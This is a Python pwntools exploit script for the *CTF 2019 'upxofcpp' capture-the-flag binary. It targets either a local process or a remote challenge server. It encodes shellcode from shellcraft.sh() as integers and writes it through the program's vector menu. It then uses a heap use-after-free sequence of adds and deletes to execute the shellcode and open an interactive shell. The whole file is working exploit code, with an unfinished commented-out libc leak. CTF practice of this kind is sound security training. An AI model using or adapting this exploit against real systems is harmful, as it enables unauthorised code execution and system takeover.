import sys
from pwn import *
from ctypes import *
context.log_level='debug'
context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./starctf_2019_upxofcpp')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./starctf_2019_upxofcpp')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('node3.buuoj.cn',26444)
			elf=ELF('./starctf_2019_upxofcpp')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]

		def add(a,b,c):
			io.sendlineafter('Your choice:','1')
			io.sendlineafter('Index:',str(a))
			io.sendlineafter('Size:',str(b))
			io.sendlineafter('-1 to stop:',str(c))

		def delete(a):
			io.sendlineafter('Your choice:','2')
			io.sendlineafter('vec index:',str(a))

		def edit(a,c):
			io.sendlineafter('Your choice:','3')
			io.sendlineafter('vec index:',str(a))
			io.sendafter('content:\n',c)

		def show(a):
			io.sendlineafter('Your choice:','4')
			io.sendlineafter('vec index:',str(a))
		


		shell=asm(shellcraft.sh())
		shell_list=[0,0,0]
		for i in range(12):
			num=u32(shell[i*4:i*4+4])
			if num >0x80000000 :
				shell_list.append(num-0x100000000)
			else :
				shell_list.append(num)
		print len(shell)
		add(6,6,1)
		io.sendline('1')
		io.sendline('1')
		io.sendline('1')
		io.sendline(str(u32('\xeb\x7e'.ljust(4,'\x00'))))
		io.sendline('-1')
		add(4,6,-1)
		add(0,32,1)
		for i in range(len(shell_list)):
			io.sendline(str(shell_list[i]))
		io.sendline(str(-1))
		add(1,32,-1)
		add(3,32,-1)
		delete(4)
		delete(0)
		delete(1)
		add(2,6,-1)
		delete(2)
		

		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# system_addr=libc.sym['system']
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue